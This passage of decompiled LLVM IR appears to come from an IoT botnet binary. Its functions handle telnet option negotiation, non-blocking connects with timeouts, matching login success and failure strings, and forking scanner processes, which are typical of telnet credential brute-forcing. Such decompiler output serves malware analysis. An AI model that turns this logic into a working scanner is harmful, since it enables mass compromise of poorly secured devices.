  br i1 %v7_985c23, label %dec_label_pc_9794.lr.ph, label %dec_label_pc_98e8.preheader

dec_label_pc_9794.lr.ph:                          ; preds = %dec_label_pc_9854.preheader, %dec_label_pc_9848
  %stack_var_-44.024 = phi i32 [ %v1_984c, %dec_label_pc_9848 ], [ %tmp33, %dec_label_pc_9854.preheader ]
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_9794

dec_label_pc_9794:                                ; preds = %dec_label_pc_9794.lr.ph, %dec_label_pc_9794
  %storemerge615 = phi i32 [ 0, %dec_label_pc_9794.lr.ph ], [ %v1_97a8, %dec_label_pc_9794 ]
  %v5_97a0 = mul nuw nsw i32 %storemerge615, 4
  %v6_97a0 = add i32 %v5_97a0, %v2_96a4
  %v7_97a0 = inttoptr i32 %v6_97a0 to i32*
  store i32 0, i32* %v7_97a0, align 4
  %v1_97a8 = add nuw nsw i32 %storemerge615, 1
  %tmp53 = icmp ult i32 %v1_97a8, 32
  br i1 %tmp53, label %dec_label_pc_9794, label %dec_label_pc_97bc

dec_label_pc_97bc:                                ; preds = %dec_label_pc_9794
  %v2_97dc = load i32, i32* %v1_9700, align 4
  %v2_97f0 = or i32 %v2_97dc, %v6_9710
  store i32 %v2_97f0, i32* %v1_9700, align 4
  %v5_9830 = call i32 @__libc_select(i32 %v1_9734, i32 %v2_96a4, i32 0, i32 %v2_96a4, i32 %v2_9740)
  %v5_9844 = icmp sgt i32 %v5_9830, 0
  br i1 %v5_9844, label %dec_label_pc_98e8.preheader, label %dec_label_pc_9848

dec_label_pc_9848:                                ; preds = %dec_label_pc_97bc
  %v1_984c = add nsw i32 %stack_var_-44.024, 1
  %v7_985c = icmp slt i32 %v1_984c, 10
  br i1 %v7_985c, label %dec_label_pc_9794.lr.ph, label %dec_label_pc_98e8.preheader

dec_label_pc_98e8.preheader:                      ; preds = %dec_label_pc_9848, %dec_label_pc_97bc, %dec_label_pc_9854.preheader, %dec_label_pc_96e0
  %v5_9890 = bitcast i8* %stack_var_-185 to i32*
  %not.v7_98f057 = icmp sgt i32 %arg3, 1
  %v2_990859 = icmp eq i1 %not.v7_98f057, false
  br i1 %v2_990859, label %dec_label_pc_9910, label %dec_label_pc_9874

dec_label_pc_9874:                                ; preds = %dec_label_pc_98e8.preheader, %dec_label_pc_98dc
  %v1_98ec62.in = phi i32 [ %v1_98ec62, %dec_label_pc_98dc ], [ %arg3, %dec_label_pc_98e8.preheader ]
  %stack_var_-40.061 = phi i8* [ %v5_98cc, %dec_label_pc_98dc ], [ %arg2, %dec_label_pc_98e8.preheader ]
  %stack_var_-36.060 = phi i32 [ %v1_98e0, %dec_label_pc_98dc ], [ 0, %dec_label_pc_98e8.preheader ]
  %v1_98ec62 = add i32 %v1_98ec62.in, -1
  %v2_9878 = load i32, i32* @global_var_22864.48, align 4
  %v6_9890 = call i32 @__libc_recv(i32 %v2_9878, i32* %v5_9890, i32 1, i32 0, i32 %v1_98ec62)
  %v7_9898 = icmp eq i32 %v6_9890, 1
  br i1 %v7_9898, label %dec_label_pc_98b8, label %dec_label_pc_98a0

dec_label_pc_98a0:                                ; preds = %dec_label_pc_9874
  store i8 0, i8* %stack_var_-40.061, align 1
  br label %dec_label_pc_9924

dec_label_pc_98b8:                                ; preds = %dec_label_pc_9874
  %v3_98b8 = load i8, i8* %stack_var_-185, align 1
  %v4_98bc = ptrtoint i8* %stack_var_-40.061 to i32
  store i8 %v3_98b8, i8* %stack_var_-40.061, align 1
  %v1_98c8 = add i32 %v4_98bc, 1
  %v5_98cc = inttoptr i32 %v1_98c8 to i8*
  %v3_98d0 = load i8, i8* %stack_var_-185, align 1
  %v7_98d4 = icmp eq i8 %v3_98d0, 10
  br i1 %v7_98d4, label %dec_label_pc_9910, label %dec_label_pc_98dc

dec_label_pc_98dc:                                ; preds = %dec_label_pc_98b8
  %v1_98e0 = add i32 %stack_var_-36.060, 1
  %not.v7_98f0 = icmp sgt i32 %v1_98ec62, 1
  %v2_9908 = icmp eq i1 %not.v7_98f0, false
  br i1 %v2_9908, label %dec_label_pc_9910, label %dec_label_pc_9874

dec_label_pc_9910:                                ; preds = %dec_label_pc_98b8, %dec_label_pc_98dc, %dec_label_pc_98e8.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_98e8.preheader ], [ %v1_98e0, %dec_label_pc_98dc ], [ %stack_var_-36.060, %dec_label_pc_98b8 ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_98e8.preheader ], [ %v5_98cc, %dec_label_pc_98dc ], [ %v5_98cc, %dec_label_pc_98b8 ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_9924

dec_label_pc_9924:                                ; preds = %dec_label_pc_98a0, %dec_label_pc_9910
  %storemerge = phi i32 [ -1, %dec_label_pc_98a0 ], [ %stack_var_-36.0.lcssa, %dec_label_pc_9910 ]
  %v2_9930 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_9930, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_98ec62, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.061, { 1, 2, 0 }
  uselistorder i32 %v1_984c, { 1, 0 }
  uselistorder i32 %storemerge615, { 1, 0 }
  uselistorder i32 %storemerge527, { 1, 0 }
  uselistorder i32 %v2_96a4, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9924, { 1, 0 }
  uselistorder label %dec_label_pc_9910, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9874, { 1, 0 }
  uselistorder label %dec_label_pc_9794, { 1, 0 }
  uselistorder label %dec_label_pc_9794.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_96b8, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_993c = load i32, i32* @fp, align 4
  %v1_9950 = add i32 %arg1, 4
  %v2_9950 = inttoptr i32 %v1_9950 to i32*
  %v3_9950 = load i32, i32* %v2_9950, align 4
  store i32 %v3_9950, i32* @r0, align 4
  %v1_995c = call i32 @__GI_inet_ntoa(i32 %v3_9950)
  store i32 %v3_993c, i32* @fp, align 4
  ret i32 %v1_995c
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_9974 = load i32, i32* @fp, align 4
  store i32 39292, i32* %stack_var_-4, align 4
  %v2_9978 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9978, i32* @fp, align 4
  store i32 %arg4, i32* @r2, align 4
  %v4_99a0 = call i32 @__GI_memset(i8* %arg3, i32 0)
  %v5_99b4 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_99c4 = load i8, i8* %arg3, align 1
  %v2_99c8 = icmp eq i8 %v2_99c4, -1
  br i1 %v2_99c8, label %dec_label_pc_99d0, label %dec_label_pc_99e0

dec_label_pc_99d0:                                ; preds = %entry
  %v3_99c4 = zext i8 %v2_99c4 to i32
  %v6_99dc = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %v3_99c4, i32 %v5_99b4)
  br label %dec_label_pc_99e0

dec_label_pc_99e0:                                ; preds = %entry, %dec_label_pc_99d0
  %v3_99e4 = load i32, i32* %stack_var_0, align 4
  %v3_99e8 = call i32 @contains_string(i32 %tmp, i32 %v3_99e4)
  %v2_99f0 = icmp ne i32 %v3_99e8, 0
  %. = zext i1 %v2_99f0 to i32
  store i32 %v3_9974, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i8 %v2_99c4, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_99e0, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9a60.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9a20 = load i32, i32* @fp, align 4
  store i32 %v3_9a20, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_9a4c = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_9a60

dec_label_pc_9a60:                                ; preds = %dec_label_pc_9a60.lr.ph, %dec_label_pc_9a60
  %storemerge25 = phi i32 [ 0, %dec_label_pc_9a60.lr.ph ], [ %v1_9a74, %dec_label_pc_9a60 ]
  %v5_9a6c = mul nuw nsw i32 %storemerge25, 4
  %v6_9a6c = add i32 %v5_9a6c, %v2_9a4c
  %v7_9a6c = inttoptr i32 %v6_9a6c to i32*
  store i32 0, i32* %v7_9a6c, align 4
  %v1_9a74 = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_9a74, 32
  br i1 %tmp21, label %dec_label_pc_9a60, label %dec_label_pc_9a88

dec_label_pc_9a88:                                ; preds = %dec_label_pc_9a60
  %v13_9a20 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9a8c = udiv i32 %arg1, 32
  %v3_9a98 = mul nuw nsw i32 %v3_9a8c, 4
  %v2_9aa0 = add nsw i32 %v3_9a98, -136
  %v2_9aa4 = add i32 %v2_9aa0, %v13_9a20
  %v1_9aa8 = inttoptr i32 %v2_9aa4 to i32*
  %v2_9aa8 = load i32, i32* %v1_9aa8, align 4
  %v1_9ab0 = urem i32 %arg1, 32
  %v6_9ab8 = shl i32 1, %v1_9ab0
  %v2_9abc = or i32 %v2_9aa8, %v6_9ab8
  store i32 %v2_9abc, i32* %v1_9aa8, align 4
  %v1_9adc = add i32 %arg1, 1
  %v2_9ae4 = ptrtoint i32* %stack_var_-160 to i32
  %v5_9af8 = call i32 @__libc_select(i32 %v1_9adc, i32 %v2_9a4c, i32 0, i32 0, i32 %v2_9ae4)
  %v5_9b04 = icmp sgt i32 %v5_9af8, 0
  br i1 %v5_9b04, label %dec_label_pc_9b14, label %dec_label_pc_9b08

dec_label_pc_9b08:                                ; preds = %dec_label_pc_9a88
  br label %dec_label_pc_9b34

dec_label_pc_9b14:                                ; preds = %dec_label_pc_9a88
  %v5_9b28 = inttoptr i32 %arg3 to i32*
  %v6_9b28 = call i32 @__libc_recv(i32 %arg1, i32* %v5_9b28, i32 %arg4, i32 0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_9b34

dec_label_pc_9b34:                                ; preds = %dec_label_pc_9b08, %dec_label_pc_9b14
  %storemerge = phi i32 [ %v6_9b28, %dec_label_pc_9b14 ], [ 0, %dec_label_pc_9b08 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_9a4c, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_9b34, { 1, 0 }
  uselistorder label %dec_label_pc_9a60, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_9b60 = icmp eq i32 %arg2, 0
  br i1 %v2_9b60, label %dec_label_pc_9b68, label %dec_label_pc_9b78

dec_label_pc_9b68:                                ; preds = %entry
  %v2_9b6c = load i32, i32* %arg1, align 4
  %v1_9b74 = call i32 @__libc_close(i32 %v2_9b6c)
  br label %dec_label_pc_9b78

dec_label_pc_9b78:                                ; preds = %entry, %dec_label_pc_9b68
  %v2_9b80 = add i32 %tmp, 16
  %v3_9b80 = inttoptr i32 %v2_9b80 to i32*
  store i32 0, i32* %v3_9b80, align 4
  %v3_9b84 = load i32, i32* %stack_var_-24, align 4
  %v1_9b90 = trunc i32 %v3_9b84 to i8
  %v3_9b90 = add i32 %tmp, 8
  %v4_9b90 = inttoptr i32 %v3_9b90 to i8*
  store i8 %v1_9b90, i8* %v4_9b90, align 1
  %v1_9b98 = add i32 %tmp, 24
  %v2_9b98 = inttoptr i32 %v1_9b98 to i32*
  %v3_9b98 = load i32, i32* %v2_9b98, align 4
  store i32 1024, i32* @r2, align 4
  %v2_9ba8 = inttoptr i32 %v3_9b98 to i8*
  %v3_9ba8 = call i32 @__GI_memset(i8* %v2_9ba8, i32 0)
  ret i32 %v3_9ba8

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9b78, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_9bb8 = load i32, i32* @fp, align 4
  %v2_9bd0 = inttoptr i32 %arg1 to i32*
  %v3_9bd0 = call i32 @advance_state(i32* %v2_9bd0, i32 0)
  %v3_9bdc = add i32 %arg1, 9
  %v4_9bdc = inttoptr i32 %v3_9bdc to i8*
  store i8 1, i8* %v4_9bdc, align 1
  store i32 %v3_9bb8, i32* @fp, align 4
  ret i32 %v3_9bd0
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9be8 = load i32, i32* @fp, align 4
  %v3_9c00 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_224a0.53 to i32))
  store i32 %v3_9be8, i32* @fp, align 4
  ret i32 %v3_9c00
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9c18 = load i32, i32* @fp, align 4
  %v3_9c30 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_22480.62 to i32))
  store i32 %v3_9c18, i32* @fp, align 4
  ret i32 %v3_9c30

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 40016, i32* %stack_var_-4, align 4
  %v2_9c4c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9c4c, i32* @fp, align 4
  %v1_9c5c = call i32 @contains_success(i32 %arg1)
  %v2_9c64 = icmp eq i32 %v1_9c5c, 0
  br i1 %v2_9c64, label %dec_label_pc_9c6c, label %dec_label_pc_9c94

dec_label_pc_9c6c:                                ; preds = %entry
  %v1_9c70 = call i32 @contains_fail(i32 %arg1)
  %v2_9c78 = icmp ne i32 %v1_9c70, 0
  %. = zext i1 %v2_9c78 to i32
  br label %dec_label_pc_9c94

dec_label_pc_9c94:                                ; preds = %dec_label_pc_9c6c, %entry
  %storemerge1 = phi i32 [ 1, %entry ], [ %., %dec_label_pc_9c6c ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_9cd4

dec_label_pc_9cd4:                                ; preds = %dec_label_pc_9cd4, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_9cd8, %dec_label_pc_9cd4 ]
  %v1_9cd8 = add i32 %stack_var_-24.0, 1
  %v3_9ce4 = mul i32 %v1_9cd8, 4
  %v2_9cf0 = add i32 %v3_9ce4, %arg2
  %v1_9cf4 = inttoptr i32 %v2_9cf0 to i32*
  %v2_9cf4 = load i32, i32* %v1_9cf4, align 4
  %v2_9cf8 = icmp eq i32 %v2_9cf4, 0
  br i1 %v2_9cf8, label %dec_label_pc_9d54.preheader, label %dec_label_pc_9cd4

dec_label_pc_9d54.preheader:                      ; preds = %dec_label_pc_9cd4
  %v3_9d2c = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_9d54

dec_label_pc_9d0c:                                ; preds = %dec_label_pc_9d54
  %v3_9d10 = mul i32 %storemerge2, 4
  %v2_9d1c = add i32 %v3_9d10, %arg2
  %v1_9d20 = inttoptr i32 %v2_9d1c to i32*
  %v2_9d20 = load i32, i32* %v1_9d20, align 4
  %v4_9d2c = call i32 @strcasestr(i8* %v3_9d2c, i32 %v2_9d20, i32 %v3_9d10)
  %v2_9d34 = icmp eq i32 %v4_9d2c, 0
  %v1_9d4c = add nuw i32 %storemerge2, 1
  br i1 %v2_9d34, label %dec_label_pc_9d54, label %dec_label_pc_9d6c

dec_label_pc_9d54:                                ; preds = %dec_label_pc_9d0c, %dec_label_pc_9d54.preheader
  %storemerge2 = phi i32 [ %v1_9d4c, %dec_label_pc_9d0c ], [ 0, %dec_label_pc_9d54.preheader ]
  %v5_9d60 = icmp slt i32 %storemerge2, %v1_9cd8
  br i1 %v5_9d60, label %dec_label_pc_9d0c, label %dec_label_pc_9d6c

dec_label_pc_9d6c:                                ; preds = %dec_label_pc_9d54, %dec_label_pc_9d0c
  %storemerge3 = phi i32 [ 1, %dec_label_pc_9d0c ], [ 0, %dec_label_pc_9d54 ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_9cd8, { 1, 0, 2 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9d80 = load i32, i32* @fp, align 4
  store i32 %v3_9d80, i32* %stack_var_-16, align 4
  %v13_9d80 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r2, align 4
  %v2_9da8 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9db8 = or i32 %v2_9da8, 2048
  store i32 %v1_9db8, i32* @r2, align 4
  %v2_9dcc = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_9de8 = urem i32 %arg3, 65536
  %v1_9df0 = call i32 @htons(i32 %v3_9de8)
  %v3_9e18 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_9e20 = icmp eq i32 %v3_9e18, 0
  br i1 %v2_9e20, label %dec_label_pc_9e34, label %dec_label_pc_9e28

dec_label_pc_9e28:                                ; preds = %entry
  br label %dec_label_pc_9fec

dec_label_pc_9e34:                                ; preds = %entry
  %v3_9e5c = bitcast i32* %stack_var_-48 to %sockaddr*
  %v4_9e5c = call i32 @__libc_connect(i32 %arg1, %sockaddr* %v3_9e5c, i32 16)
  %v1_9e6c = icmp slt i32 %v4_9e5c, 0
  br i1 %v1_9e6c, label %dec_label_pc_9e74, label %dec_label_pc_9fb0

dec_label_pc_9e74:                                ; preds = %dec_label_pc_9e34
  %v0_9e74 = call i32 @__errno_location()
  %v1_9e7c = inttoptr i32 %v0_9e74 to i32*
  %v2_9e7c = load i32, i32* %v1_9e7c, align 4
  %v7_9e80 = icmp eq i32 %v2_9e7c, 115
  br i1 %v7_9e80, label %dec_label_pc_9eac.lr.ph, label %dec_label_pc_9fa4

dec_label_pc_9eac.lr.ph:                          ; preds = %dec_label_pc_9e74
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_9e98 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9eac

dec_label_pc_9eac:                                ; preds = %dec_label_pc_9eac.lr.ph, %dec_label_pc_9eac
  %storemerge14 = phi i32 [ 0, %dec_label_pc_9eac.lr.ph ], [ %v1_9ec0, %dec_label_pc_9eac ]
  %v5_9eb8 = mul nuw nsw i32 %storemerge14, 4
  %v6_9eb8 = add i32 %v5_9eb8, %v2_9e98
  %v7_9eb8 = inttoptr i32 %v6_9eb8 to i32*
  store i32 0, i32* %v7_9eb8, align 4
  %v1_9ec0 = add nuw nsw i32 %storemerge14, 1
  %tmp32 = icmp ult i32 %v1_9ec0, 32
  br i1 %tmp32, label %dec_label_pc_9eac, label %dec_label_pc_9ed4

dec_label_pc_9ed4:                                ; preds = %dec_label_pc_9eac
  %v3_9ed8 = udiv i32 %arg1, 32
  %v3_9ee4 = mul nuw nsw i32 %v3_9ed8, 4
  %v2_9eec = add nsw i32 %v3_9ee4, -160
  %v2_9ef0 = add i32 %v2_9eec, %v13_9d80
  %v1_9ef4 = inttoptr i32 %v2_9ef0 to i32*
  %v2_9ef4 = load i32, i32* %v1_9ef4, align 4
  %v1_9efc = urem i32 %arg1, 32
  %v6_9f04 = shl i32 1, %v1_9efc
  %v2_9f08 = or i32 %v2_9ef4, %v6_9f04
  store i32 %v2_9f08, i32* %v1_9ef4, align 4
  %v1_9f28 = add i32 %arg1, 1
  %v2_9f30 = ptrtoint i32* %stack_var_-184 to i32
  %v5_9f48 = call i32 @__libc_select(i32 %v1_9f28, i32 0, i32 %v2_9e98, i32 0, i32 %v2_9f30)
  %tmp33 = icmp slt i32 %v5_9f48, 1
  br i1 %tmp33, label %dec_label_pc_9f98, label %dec_label_pc_9f58

dec_label_pc_9f58:                                ; preds = %dec_label_pc_9ed4
  %v0_9f7c = call i32 @getsockopt()
  %v3_9f80 = load i32, i32* %stack_var_-192, align 4
  %v2_9f84 = icmp eq i32 %v3_9f80, 0
  br i1 %v2_9f84, label %dec_label_pc_9fb0, label %dec_label_pc_9f8c

dec_label_pc_9f8c:                                ; preds = %dec_label_pc_9f58
  br label %dec_label_pc_9fec

dec_label_pc_9f98:                                ; preds = %dec_label_pc_9ed4
  br label %dec_label_pc_9fec

dec_label_pc_9fa4:                                ; preds = %dec_label_pc_9e74
  br label %dec_label_pc_9fec

dec_label_pc_9fb0:                                ; preds = %dec_label_pc_9e34, %dec_label_pc_9f58
  store i32 0, i32* @r2, align 4
  %v2_9fbc = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9fcc = and i32 %v2_9fbc, -2049
  store i32 %v1_9fcc, i32* @r2, align 4
  %v2_9fe0 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_9fec

dec_label_pc_9fec:                                ; preds = %dec_label_pc_9fa4, %dec_label_pc_9f98, %dec_label_pc_9f8c, %dec_label_pc_9e28, %dec_label_pc_9fb0
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_9f98 ], [ 1, %dec_label_pc_9fb0 ], [ 0, %dec_label_pc_9f8c ], [ 0, %dec_label_pc_9fa4 ], [ 0, %dec_label_pc_9e28 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_9e98, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 1, 0, 5, 6, 7 }
  uselistorder label %dec_label_pc_9fec, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_9fb0, { 1, 0 }
  uselistorder label %dec_label_pc_9eac, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_9ffc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_9ffc, i32* @ip, align 4
  %v3_a000 = load i32, i32* @r4, align 4
  %v6_a000 = load i32, i32* @r5, align 4
  %v9_a000 = load i32, i32* @r6, align 4
  %v0_a00c = call i32 @__libc_fork()
  %v2_a01c = icmp eq i32 %v0_a00c, 0
  br i1 %v2_a01c, label %dec_label_pc_a17c, label %dec_label_pc_a030

dec_label_pc_a030:                                ; preds = %entry
  %v2_a034 = load i32, i32* @global_var_2286c.64, align 4
  %v5_a034 = load i32, i32* @global_var_22870.65, align 4
  %v2_a040 = add i32 %v2_a034, 1
  %v3_a040 = icmp eq i32 %v2_a040, 0
  %v4_a044 = zext i1 %v3_a040 to i32
  %v5_a044 = add i32 %v4_a044, %v5_a034
  store i32 %v2_a040, i32* @global_var_2286c.64, align 4
  store i32 %v5_a044, i32* @global_var_22870.65, align 4
  %v3_a058 = udiv i32 %v2_a040, 1073741824
  %v3_a05c = mul i32 %v5_a044, 4
  %v2_a060 = or i32 %v3_a05c, %v3_a058
  store i32 %v2_a060, i32* @r4, align 4
  %v3_a064 = mul i32 %v2_a040, 4
  %v1_a068 = add i32 %v3_a064, 4
  %v1_a070 = call i32 @malloc(i32 %v1_a068)
  br label %dec_label_pc_a0c8

dec_label_pc_a088:                                ; preds = %dec_label_pc_a0c8, %dec_label_pc_a114
  %v3_a08c = mul i32 %storemerge2, 4
  %v2_a098 = add i32 %v3_a08c, %v1_a070
  %v2_a0ac = load i32, i32* @global_var_28af0.67, align 4
  %v2_a0b0 = add i32 %v2_a0ac, %v3_a08c
  %v1_a0b4 = inttoptr i32 %v2_a0b0 to i32*
  %v2_a0b4 = load i32, i32* %v1_a0b4, align 4
  %v2_a0b8 = inttoptr i32 %v2_a098 to i32*
  store i32 %v2_a0b4, i32* %v2_a0b8, align 4
  %v1_a0c0 = add i32 %storemerge2, 1
  br label %dec_label_pc_a0c8

dec_label_pc_a0c8:                                ; preds = %dec_label_pc_a030, %dec_label_pc_a088
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a030 ], [ %v1_a0c0, %dec_label_pc_a088 ]
  %v2_a0e0 = load i32, i32* @global_var_2286c.64, align 4
  %v5_a0e0 = load i32, i32* @global_var_22870.65, align 4
  %v2_a0f4 = add i32 %v2_a0e0, -1
  %v3_a0f4 = icmp ne i32 %v2_a0e0, 0
  %v3_a0f8 = add i32 %v5_a0e0, -1
  %v5_a0f8 = sext i1 %v3_a0f4 to i32
  %v9_a10c = icmp eq i32 %v3_a0f8, %v5_a0f8
  br i1 %v9_a10c, label %dec_label_pc_a114, label %dec_label_pc_a088

dec_label_pc_a114:                                ; preds = %dec_label_pc_a0c8
  store i32 %v2_a0f4, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a0f4, %storemerge2
  br i1 %tmp, label %dec_label_pc_a088, label %dec_label_pc_a134

dec_label_pc_a134:                                ; preds = %dec_label_pc_a114
  store i32 %v5_a0e0, i32* @r4, align 4
  %v3_a13c = mul i32 %v2_a0e0, 4
  %v2_a148 = add i32 %v1_a070, -4
  %v1_a14c = add i32 %v2_a148, %v3_a13c
  %v2_a154 = inttoptr i32 %v1_a14c to i32*
  store i32 %v0_a00c, i32* %v2_a154, align 4
  %v2_a15c = load i32, i32* @global_var_28af0.67, align 4
  store i32 %v2_a15c, i32* @r0, align 4
  %v0_a164 = call i32 @free()
  store i32 %v1_a070, i32* @global_var_28af0.67, align 4
  br label %dec_label_pc_a17c

dec_label_pc_a17c:                                ; preds = %entry, %dec_label_pc_a134
  store i32 %v3_a000, i32* @r4, align 4
  store i32 %v6_a000, i32* @r5, align 4
  store i32 %v9_a000, i32* @r6, align 4
  ret i32 %v0_a00c

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a08c, { 1, 0 }
  uselistorder i32 %v1_a070, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a17c, { 1, 0 }
  uselistorder label %dec_label_pc_a0c8, { 1, 0 }
  uselistorder label %dec_label_pc_a088, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a1b4 = add i32 %arg2, 1
  %v1_a1b8 = inttoptr i32 %v1_a1b4 to i8*
  %v2_a1b8 = load i8, i8* %v1_a1b8, align 1
  %v7_a1c4 = icmp ult i8 %v2_a1b8, -5
  br i1 %v7_a1c4, label %dec_label_pc_a310, label %dec_label_pc_a1cc

dec_label_pc_a1cc:                                ; preds = %entry
  %v7_a1d4 = icmp eq i8 %v2_a1b8, -1
  br i1 %v7_a1d4, label %dec_label_pc_a1d8, label %dec_label_pc_a1f4

dec_label_pc_a1d8:                                ; preds = %dec_label_pc_a1cc
  br label %dec_label_pc_a310

dec_label_pc_a1f4:                                ; preds = %dec_label_pc_a1cc
  store i8 -1, i8* %stack_var_-17, align 1
  %v5_a210 = bitcast i8* %stack_var_-17 to i32*
  %v6_a210 = call i32 @__libc_send(i32 %arg1, i32* %v5_a210, i32 1, i32 16384)
  %v2_a21c = load i8, i8* %v1_a1b8, align 1
  %v7_a220 = icmp eq i8 %v2_a21c, -4
  br i1 %v7_a220, label %dec_label_pc_a228, label %dec_label_pc_a234

dec_label_pc_a228:                                ; preds = %dec_label_pc_a1f4
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2d4

dec_label_pc_a234:                                ; preds = %dec_label_pc_a1f4
  %v2_a23c = load i8, i8* %v1_a1b8, align 1
  %v7_a240 = icmp eq i8 %v2_a23c, -2
  br i1 %v7_a240, label %dec_label_pc_a248, label %dec_label_pc_a254

dec_label_pc_a248:                                ; preds = %dec_label_pc_a234
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2d4

dec_label_pc_a254:                                ; preds = %dec_label_pc_a234
  %v2_a25c = load i8, i8* %v1_a1b8, align 1
  %v7_a260 = icmp eq i8 %v2_a25c, 3
  %v7_a274 = icmp eq i8 %v2_a25c, -3
  br i1 %v7_a260, label %dec_label_pc_a268, label %dec_label_pc_a2a0

